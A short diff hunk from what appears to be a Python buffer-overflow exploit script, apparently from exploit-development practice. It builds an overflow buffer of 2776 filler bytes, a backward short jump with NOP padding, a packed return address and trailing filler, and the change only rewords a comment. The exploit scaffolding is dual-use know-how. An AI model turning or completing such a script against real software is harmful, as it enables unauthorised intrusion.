@@ -2,7 +2,7 @@ import socket, os, sys
 from struct import pack
 
 crash = "A" * 2776
-crash += "\xeb\xd0\x90\x90"     # JMP D2 with additional padding - https://thestarman.pcministry.com/asm/2bytejumps.htm
+crash += "\xeb\xd0\x90\x90"     # using 'JMP D2' to jump backwards with additional padding - https://thestarman.pcministry.com/asm/2bytejumps.htm
 crash += pack("<L", 0x00475ea6)
 crash += "C" * (3000 - 2776 - 4 - 4)
 
